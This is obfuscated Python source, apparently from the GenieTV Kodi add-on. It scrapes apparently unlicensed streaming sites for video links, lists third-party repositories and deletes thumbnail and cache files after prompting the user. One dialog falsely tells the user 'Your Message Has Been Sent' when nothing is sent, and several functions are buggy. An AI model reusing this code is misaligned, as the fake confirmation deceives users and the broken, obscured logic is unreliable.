    if 94 - 94: OoOoOO00 / i1IIi * i1IIi + oOO - oOO % OOooOOo
    if 12 - 12: I1I1ii / I1IiI . i11iIiiIii * i11iIiiIii
    if 68 - 68: iI1Ii11iII1 * Ooo00oOo00o . OOoo0OO0 / oO0O . OOooOOo - i11iIiiIii
    if 49 - 49: Oo / oO0O % OOoo0OO0 + Ooo0OO0oOO - Ooo00oOo00o
    if 13 - 13: OoOoOO00
IIi1I1 = '{SF},' ; oO00o0oOoo = '{IF},' ; oOOI1 = '{PW},' ; OO0oO0Oo = '{AM},' ; OO = '{GF},' ; I1ii1 = '{DD},' ; II1iII1 = '{UO},' ; O00o = '{LE},' ; Ii11Iiii1iiii = '{ZY},' ; i1IIII1111 = '{UE},' ; Ooo0o0000OO = '{PE},' ; iIiI1II1I1 = '{JE},' ; Oo0o00o = '{TH},' ; III1I1 = '{LK},'
if 83 - 83: OoooooooOO . OOOo0 + oO0O * O0 / Ooo0OO0oOO
if 8 - 8: i1IIi + OoOoOO00 / oO0O + ii11ii1ii % oO0O - iIii1I11I1II1
def iIi1iI ( ) :
 IIi1IIIi = I1ii1Ii1 ( 'http://www.iwatchseries.me/tv-list/' )
 IiI11iII1 = re . compile ( '<h5><a href="([^"]*)"><strong>(.+?)</strong></a></h5>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , ooooO0oOoOOoO , 8021 , ii11iIi1I + 'iwatch.png' )
def i11ii ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<h5><strong><a href="([^"]*)">(.+?)</a>(.+?)</strong></h5>' ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 , Ii11iiI in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 + Ii11iiI , url , 8022 , ii11iIi1I + 'iwatch.png' )
def IiI111I ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '<iframe src="([^"]*)"' ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  print '>>>>>>>>>>>>>>>>>>>>' + url
  oo0oO0 ( url )
def oo0oO0 ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '{.+?"file" : "(.+?)",.+?"default" : true.+?"label" : "(.+?)"' , re . DOTALL ) . findall ( IIi1IIIi )
 IIII11I1I = re . compile ( 'setup\(\{.+?file: "(.+?)",.+?skin' , re . DOTALL ) . findall ( IIi1IIIi )
 I1i1ii1IiIii = re . compile ( "{ label: '([^']*)', file:.+?'([^']*)' }" ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  I1i1iii1Ii ( 'VidSpot - ' + oO00oooOOoOo0 , url , 222 , ii11iIi1I + 'iwatch.png' )
 for url in IIII11I1I :
  I1i1iii1Ii ( 'VodLocker' , url , 222 , ii11iIi1I + 'iwatch.png' )
 for oO00oooOOoOo0 , url in I1i1ii1IiIii :
  print '<><><><><><><><><><><> before   ' + url
  if 'hevideo' in url :
   print '>>>>>>>>>>>>>>>>>>>>>>>>>' + url
   I1i1iii1Ii ( 'TheVideo - ' + oO00oooOOoOo0 , url , 222 , ii11iIi1I + 'iwatch.png' )
   if 49 - 49: OoooooooOO - iI1Ii11iII1
def Iiii11 ( ) :
 IIi1IIIi = cloudflare . source ( 'http://www.animeland.me/anime-list' )
 IiI11iII1 = re . compile ( 'letter-spacing:-1px;" href="([^"]*)">(.+?)</a></li>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , ooooO0oOoOOoO , 1021 , ii11iIi1I + 'anime.png' )
  if 65 - 65: I1I1ii + II1i1IiiIIi11 * II1i1IiiIIi11
  if 79 - 79: i1IIi / Oo - OOOo0 . O0
def O00oOoo00O ( ) :
 IIi1IIIi = I1ii1Ii1 ( 'http://www.animetoon.org/cartoon' )
 IiI11iII1 = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( IIi1IIIi )
 for ooooO0oOoOOoO , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , ooooO0oOoOOoO , 1002 , ii11iIi1I + 'anime.png' )
  if 25 - 25: i11iIiiIii + ii11ii1ii - OoooooooOO . O0 % I1I1ii
  if 53 - 53: i1IIi
  if 59 - 59: OOooOOo + OOOo0 % OoooooooOO - iIii1I11I1II1
def iiIII1i1 ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IIII11I1I = re . compile ( '<img src="(.+?)" id="series_image" width="250" height="370" alt=".+?" />' ) . findall ( IIi1IIIi )
 for IIIIiI11I11 in IIII11I1I :
  o0oO0oo0000OO = IIIIiI11I11
 I1i1ii1IiIii = re . compile ( '<li><a href="(.+?)">Next</a></li>' ) . findall ( IIi1IIIi )
 for url in I1i1ii1IiIii :
  oo0o0000Oo0 ( 'NEXT PAGE' , url , 1002 , ii11iIi1I + 'Next.png' )
 IiI11iII1 = re . compile ( '&nbsp;<a href="(.+?)">(.+?)</a>' ) . findall ( IIi1IIIi )
 for url , oO00oooOOoOo0 in IiI11iII1 :
  oo0o0000Oo0 ( oO00oooOOoOo0 , url , 1003 , o0oO0oo0000OO )
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
def oOOo0OOoOO0 ( url , IMAGE ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( '"playlist">(.+?)</span></div><div><iframe src="(.+?)"' ) . findall ( IIi1IIIi )
 for oO00oooOOoOo0 , url in IiI11iII1 :
  print oO00oooOOoOo0 + '     ' + url
  if 'easy' in url :
   IiIiIIi1IiiIi1III ( url )
  elif 'playpanda' in url :
   IiIiIIi1IiiIi1III ( url )
   if 19 - 19: i1IIi % OOOo0 - iIii1I11I1II1 - Ooo0OO0oOO / ii11ii1ii
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
def IiIiIIi1IiiIi1III ( url ) :
 IIi1IIIi = I1ii1Ii1 ( url )
 IiI11iII1 = re . compile ( "url: '(.+?)'," ) . findall ( IIi1IIIi )
 for url in IiI11iII1 :
  I1i1iii1Ii ( 'STREAM' , url , 222 , ii11iIi1I + 'anime.png' )
  if 16 - 16: oO0O
  if 79 - 79: OoooooooOO - oOO * oO0O - OoOoOO00 % I1IiI * iI1Ii11iII1
def iI1III ( url ) :
 oO0o = urllib2 . Request ( url )
 oO0o . add_header ( 'User-Agent' , "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" )
 oO0o . add_header ( 'referer' , url )
 iIiIiIIiiiI1iI1 = urllib2 . urlopen ( oO0o )
 iii1 = iIiIiIIiiiI1iI1 . read ( )
 iIiIiIIiiiI1iI1 . close ( )
 return iii1
 if 42 - 42: oOO + II1i1IiiIIi11 + oO0O * OOoo0OO0 . i1IIi
def O00Ooo ( url ) :
 oO0o = urllib2 . Request ( url )
 oO0o . add_header ( 'User-Agent' , "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" )
 iIiIiIIiiiI1iI1 = urllib2 . urlopen ( oO0o )
 iii1 = iIiIiIIiiiI1iI1 . read ( )
 iIiIiIIiiiI1iI1 . close ( )
 return iii1
 if 72 - 72: OOOo0 + oO0O
def IiI1iI1I1 ( url ) :
 xbmcplugin . addSortMethod ( handle = int ( sys . argv [ 1 ] ) , sortMethod = xbmcplugin . SORT_METHOD_TITLE )
 ooOiii1 = ( '%s%s' % ( OO0o0oO0O000o , url ) )
 iii1 = O00Ooo ( url )
 IiI11iII1 = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( iii1 )
 for url , OoOoo00Ooo00 , oO00oooOOoOo0 in IiI11iII1 :
  I1i1iii1Ii ( '%s' % ( oO00oooOOoOo0 ) . replace ( 'GenieTv' , '[COLOR green]GenieTV[/COLOR]' ) . replace ( '.' , ' ' ) . replace ( 'mp4' , '' ) . replace ( 'mkv' , '' ) . replace ( '_' , ' ' ) , '%s' % ( url ) , 222 , OoOoo00Ooo00 )
  if 5 - 5: I1I1ii % OoOoOO00 + Oo - iIii1I11I1II1
def I1i111I ( url ) :
 I1III11iiii11i1 = xbmc . Player ( iIi11I11 ( ) )
 import urlresolver
 try : I1III11iiii11i1 . play ( url )
 except : pass
 from urlresolver import common
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( 'LOADING' , 'Opening %s Now' % ( oO00oooOOoOo0 ) )
 I1III11iiii11i1 = xbmc . Player ( iIi11I11 ( ) )
 url = urlresolver . HostedMediaFile ( url ) . resolve ( )
 if Oo0oO0ooo . iscanceled ( ) :
  print "[COLORred]STREAM CANCELLED[/COLOR]"
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  if i1iiIIiiI111 . yesno ( "[B]CANCELLED[/B]" , '[B]Was There A Problem[/B]' , '' , "" , 'Yes' , 'No' ) :
   i1iiIIiiI111 . ok ( "Message Send" , "Your Message Has Been Sent" )
  else :
   return
 else :
  try : I1III11iiii11i1 . play ( url )
  except : pass
  try : o0oO0 . resolve_url ( url )
  except : pass
  Oo0oO0ooo . close ( )
  if 64 - 64: I1I1ii + iIii1I11I1II1
def I1Iii ( url ) :
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( 'Featching Your Video' , 'Featching Your Video' )
 Oo0oO0ooo . update ( 0 , '%s' % oO00oooOOoOo0 )
 xbmc . sleep ( 1 )
 I1III11iiii11i1 = xbmc . Player ( iIi11I11 ( ) )
 Oo0oO0ooo . update ( 100 , '%s' % oO00oooOOoOo0 )
 xbmc . sleep ( 1 )
 I1III11iiii11i1 . play ( url ) . strip ( )
 Oo0oO0ooo . close ( )
 if 30 - 30: i1IIi . ii11ii1ii
def o00OOo ( url ) :
 I1III11iiii11i1 = xbmc . Player ( iIi11I11 ( ) )
 import urlresolver
 url = ( url ) . strip ( )
 try : I1III11iiii11i1 . play ( url ) . strip ( )
 except : pass
 if 77 - 77: OoOoOO00 - i11iIiiIii
 if 78 - 78: oO0O
def iIi11I11 ( ) :
 try :
  o0O0oOOo00o0 = getSet ( "core-player" )
  if ( o0O0oOOo00o0 == 'DVDPLAYER' ) : iIIiI1 = xbmc . PLAYER_CORE_DVDPLAYER
  elif ( o0O0oOOo00o0 == 'MPLAYER' ) : iIIiI1 = xbmc . PLAYER_CORE_MPLAYER
  elif ( o0O0oOOo00o0 == 'PAPLAYER' ) : iIIiI1 = xbmc . PLAYER_CORE_PAPLAYER
  else : iIIiI1 = xbmc . PLAYER_CORE_AUTO
 except : iIIiI1 = xbmc . PLAYER_CORE_AUTO
 return iIIiI1
 return True
 if 52 - 52: Ooo00oOo00o
def oo0o0000Oo0 ( name , url , mode , iconimage , showcontext = True , allinfo = { } ) :
 O00oO0o = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name )
 I1i1iii = True
 IiI1iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 IiI1iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 if showcontext :
  I1III1I11I1 = [ ]
  if showcontext == 'fav' :
   I1III1I11I1 . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in O000OO0 :
   I1III1I11I1 . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , mode ) ) )
  IiI1iI1 . addContextMenuItems ( I1III1I11I1 )
 I1i1iii = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = O00oO0o , listitem = IiI1iI1 , isFolder = True )
 return I1i1iii
 if 85 - 85: I1I1ii
def iiiiI11ii ( name , url , mode , iconimage , fanart , description ) :
 if 62 - 62: oO0O % OoOoOO00 + iI1Ii11iII1 + i11i1 % Ooo0OO0oOO . OOOo0
 O00oO0o = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 I1i1iii = True
 IiI1iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 IiI1iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 IiI1iI1 . setProperty ( "Fanart_Image" , fanart )
 I1i1iii = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = O00oO0o , listitem = IiI1iI1 , isFolder = True )
 return I1i1iii
 if 53 - 53: Ooo00oOo00o % ii11ii1ii . II1i1IiiIIi11 . i1IIi . Ooo00oOo00o
def I1i1iii1Ii ( name , url , mode , iconimage , showcontext = True , allinfo = { } ) :
 O00oO0o = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name )
 I1i1iii = True
 IiI1iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 IiI1iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
 if showcontext :
  I1III1I11I1 = [ ]
  if showcontext == 'fav' :
   I1III1I11I1 . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in O000OO0 :
   I1III1I11I1 . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , mode ) ) )
  IiI1iI1 . addContextMenuItems ( I1III1I11I1 )
 I1i1iii = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = O00oO0o , listitem = IiI1iI1 , isFolder = False )
 return I1i1iii
 if 26 - 26: OOOo0 % I1IiI
 if 67 - 67: Oo - iI1Ii11iII1 * oO0O . OoooooooOO / i11iIiiIii
 if 61 - 61: OOooOOo % OOOo0 * i1IIi / OOOo0 / OoOoOO00 + I1I1ii
 if 22 - 22: iI1Ii11iII1 . II1i1IiiIIi11 + Oo
 if 45 - 45: Oo % Oo + Oo / O0 % OoooooooOO
 if 92 - 92: oO0O . I1IiI . OOoo0OO0 - OoooooooOO / oOO
def i1Iii1i1I ( heading , announce ) :
 class ooOo0 ( ) :
  WINDOW = 10147
  CONTROL_LABEL = 1
  CONTROL_TEXTBOX = 5
  def __init__ ( self , * args , ** kwargs ) :
   xbmc . executebuiltin ( "ActivateWindow(%d)" % ( self . WINDOW , ) )
   self . win = xbmcgui . Window ( self . WINDOW )
   xbmc . sleep ( 500 )
   self . setControls ( )
  def setControls ( self ) :
   self . win . getControl ( self . CONTROL_LABEL ) . setLabel ( heading )
   try : oO00oo0o00o0o = open ( announce ) ; I11I1i = oO00oo0o00o0o . read ( )
   except : I11I1i = announce
   self . win . getControl ( self . CONTROL_TEXTBOX ) . setText ( str ( I11I1i ) )
   return
 ooOo0 ( )
 ooOo0 ( )
 if 100 - 100: Ooo0OO0oOO
def iiIiiiIii11i1 ( ) :
 i1Iii1i1I ( 'These are the main Sources you should get into you XBMC' , '[COLORwhite]http://architects.x10host.com[/COLOR]--- [CR]  [COLORred]http://repo.sharktech.co.uk[/COLOR]--- [CR]   [COLORwhite]http://fusion.tvaddons.ag[/COLOR]--- [CR]  [COLORred]http://i.totalxbmc.tv[/COLOR]--- [CR]   [COLORwhite]http://www.xunitytalk.com/xfinity[/COLOR]--- [CR]  [COLORred]http://srp.nu[/COLOR]--- [CR]   [COLORwhite]http://solved.no-issue.ca[/COLOR]--- [CR]  [COLORred]http://xbmc.aminhacasadigital.com[/COLOR]--- [CR]   [COLORwhite]http://xbmc.movieshd.co[/COLOR]--- [CR]  [COLORred]http://install.kaosbox.tv[/COLOR]--- [CR]   [COLORwhite]http://kodi-repo.com/mxr[/COLOR]--- [CR]  [COLORred]http://kodi.metalkettle.co[/COLOR]--- [CR]   [COLORwhite]http://prozone.getxbmc.com[/COLOR]--- [CR]  [COLORred]http://transform.mega-tron.tv[/COLOR]--- [CR]   [COLORwhite]http://muckys.kodimediaportal.ml[/COLOR]--- [CR]  [COLORred]http://jas0npc.pcriot.com[/COLOR]--- [CR]  [COLORwhite]Sports devil source[/COLOR]--- [CR]  [COLORred]http://iwillfolo.com/iwf[/COLOR]' )
 if 87 - 87: Ooo00oOo00o + OoooooooOO . oOO * OOoo0OO0
 if 82 - 82: iIii1I11I1II1 * OoooooooOO
 if 50 - 50: I1I1ii - OoOoOO00
 if 33 - 33: iI1Ii11iII1 / iI1Ii11iII1 . i11iIiiIii * ii11ii1ii + OOooOOo
 if 16 - 16: iI1Ii11iII1
def O0O0Oooo0o ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , '' , '                                 REFRESH SUCCESSFUL :)' , "                          [COLOR gold]Brought To You By Kodi Support Group, GenieTv[/COLOR]" )
 return
 if 10 - 10: I1IiI . iI1Ii11iII1 * iIii1I11I1II1 - Ooo0OO0oOO - I1IiI / I1I1ii
 if 13 - 13: Ooo0OO0oOO + I1IiI % iI1Ii11iII1 % OoooooooOO
 if 22 - 22: I1I1ii
 if 23 - 23: O0
 if 41 - 41: i1IIi . i11i1 / oOO / OOooOOo % iI1Ii11iII1 - oO0O
 if 14 - 14: ii11ii1ii - i11iIiiIii * I1I1ii
 if 39 - 39: OoooooooOO
 if 19 - 19: i11iIiiIii
 if 80 - 80: OOOo0
 if 58 - 58: Ooo0OO0oOO + ii11ii1ii % I1IiI
 if 22 - 22: iIii1I11I1II1 - oO0O / OOOo0 * iI1Ii11iII1
 if 26 - 26: OOooOOo + i11i1 - OOooOOo + Oo . Ooo0OO0oOO
 if 97 - 97: i1IIi
 if 46 - 46: ii11ii1ii
 if 30 - 30: Ooo00oOo00o / O0 * OOooOOo * I1I1ii + OoooooooOO * II1i1IiiIIi11
 if 23 - 23: OOoo0OO0
 if 36 - 36: iI1Ii11iII1 . II1i1IiiIIi11 - i1IIi + I1I1ii
 if 54 - 54: OoooooooOO . Ooo0OO0oOO - II1i1IiiIIi11
 if 76 - 76: I1I1ii
 if 61 - 61: oOO / OoOoOO00 * oOO * I1IiI * I1I1ii . i11iIiiIii
 if 26 - 26: I1I1ii / oOO - Ooo00oOo00o . iIii1I11I1II1
 if 83 - 83: oOO % oO0O / Oo - II1i1IiiIIi11 / O0
 if 97 - 97: iIii1I11I1II1 * OOoo0OO0
 if 95 - 95: Ooo00oOo00o
def OoiIIii1Ii1 ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + o0O0o ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 47 - 47: i11i1 * oO0O % iIii1I11I1II1 / oOO
def O0O00O ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + O0ooO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 42 - 42: O0 * II1i1IiiIIi11 . I1IiI / i11i1 - oO0O . OOoo0OO0
def OO0OOO ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + Oo0O00OO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 75 - 75: iI1Ii11iII1 % OOooOOo - I1I1ii
def O0oOo0o0000 ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + I1iIiI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 100 - 100: i1IIi % oO0O
def oO000O ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + Oo0o0OoOoOo0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 36 - 36: oO0O * OOOo0 * ii11ii1ii . OOoo0OO0 * ii11ii1ii
def O0ooO0 ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + iII1i111iI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 9 - 9: i11iIiiIii + i11i1 - I1IiI / oOO % i1IIi / Ooo0OO0oOO
def iiI1II1II111 ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + OoO00oO0o00 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 25 - 25: oOO . OOooOOo % OOOo0 + II1i1IiiIIi11
def OOO0OOoOOO ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + oOoO0o0o ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 72 - 72: OOoo0OO0 * I1IiI % I1I1ii % oOO
def i1iI11iI ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + oOo0O ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 42 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 53 - 53: i1IIi % oO0O - OoooooooOO / I1IiI - iIii1I11I1II1
def I1II1iIi ( url ) :
 iii1 = I1ii1Ii1 ( iiI1IiI + IIiIi1II1IiI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IiI11iII1 = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iii1 )
 for oO00oooOOoOo0 , url , OOOO0OOO , i1i1ii , Iiii1iI1i in IiI11iII1 :
  iIiIIIi ( oO00oooOOoOo0 , url , 5 , OOOO0OOO , i1i1ii , Iiii1iI1i )
 i1IIIiiII1 ( 'movies' , 'MAIN' )
 if 99 - 99: Oo
 if 17 - 17: i11iIiiIii - i11iIiiIii + ii11ii1ii * oOO * Ooo0OO0oOO / OoooooooOO
 if 22 - 22: I1I1ii * ii11ii1ii - iI1Ii11iII1
 if 71 - 71: iIii1I11I1II1 / i11iIiiIii % OOooOOo . I1I1ii * OOOo0 % OoOoOO00
 if 35 - 35: I1I1ii - I1IiI
 if 61 - 61: I1I1ii * OOooOOo * Ooo00oOo00o + ii11ii1ii . Oo + i1IIi
 if 82 - 82: Oo + I1I1ii
 if 93 - 93: OOoo0OO0 * O0 * i11i1 - OOooOOo / ii11ii1ii
 if 54 - 54: i1IIi - Ooo00oOo00o / OoooooooOO
def ooooOOo ( ) :
 try :
  if os . path . exists ( oOOoO0 ) == True :
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   if i1iiIIiiI111 . yesno ( "Delete Thumbnails" , "[COLOR gold][B]##########WARNING ANDROID ONLY##########[/B][/COLOR]" , "This feature deletes your thumbnail folder and textures13.db" , "Are you sure you want to do proceed? This Can NOT Be Undone" ) :
    for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( oOOoO0 ) :
     O0Oo0oO0OO0 = 0
     O0Oo0oO0OO0 += len ( i1oO0OO0 )
     if O0Oo0oO0OO0 > 0 :
      for oO00oo0o00o0o in i1oO0OO0 :
       os . unlink ( os . path . join ( OooO0oOo , oO00oo0o00o0o ) )
  oo0o0 = os . path . join ( OOooO0OOoo , "Textures13.db" )
  os . unlink ( oo0o0 )
  i1iiIIiiI111 . ok ( "Restart KODI" , "Please restart KODI to rebuild thumbnail library" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Thumbnails please visit Kodi Support Group, GenieTv on facebook" )
 return
 if 88 - 88: OoooooooOO - i11i1 + O0 * iI1Ii11iII1 * OOoo0OO0
 if 8 - 8: Ooo0OO0oOO / i11iIiiIii
 if 93 - 93: I1I1ii % i11iIiiIii
 if 25 - 25: oOO % II1i1IiiIIi11 * II1i1IiiIIi11 + iIii1I11I1II1 . i1IIi
 if 67 - 67: ii11ii1ii + Ooo0OO0oOO * iI1Ii11iII1 / OoOoOO00 % Ooo00oOo00o % Ooo00oOo00o
 if 28 - 28: I1IiI % Ooo0OO0oOO - i11i1 + i11i1 + Ooo0OO0oOO / iIii1I11I1II1
 if 91 - 91: OOOo0 / OoOoOO00 * i11i1
 if 94 - 94: OoOoOO00 - iIii1I11I1II1 - iIii1I11I1II1
 if 83 - 83: ii11ii1ii * iIii1I11I1II1 + I1IiI * i1IIi . OoooooooOO % oO0O
def oOoOo00oo ( url ) :
 print '############################################################       DELETING STANDARD CACHE             ###############################################################'
 II11IiIIiiiii = os . path . join ( xbmc . translatePath ( 'special://home' ) , 'cache' )
 if os . path . exists ( II11IiIIiiiii ) == True :
  for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( II11IiIIiiiii ) :
   O0Oo0oO0OO0 = 0
   O0Oo0oO0OO0 += len ( i1oO0OO0 )
   if 66 - 66: O0 * OOooOOo / ii11ii1ii
   if 15 - 15: i11i1 . OOooOOo + OoooooooOO - Oo * iIii1I11I1II1 . i1IIi
   if O0Oo0oO0OO0 > 0 :
    if 39 - 39: oO0O % i1IIi . ii11ii1ii - O0
    i1iiIIiiI111 = xbmcgui . Dialog ( )
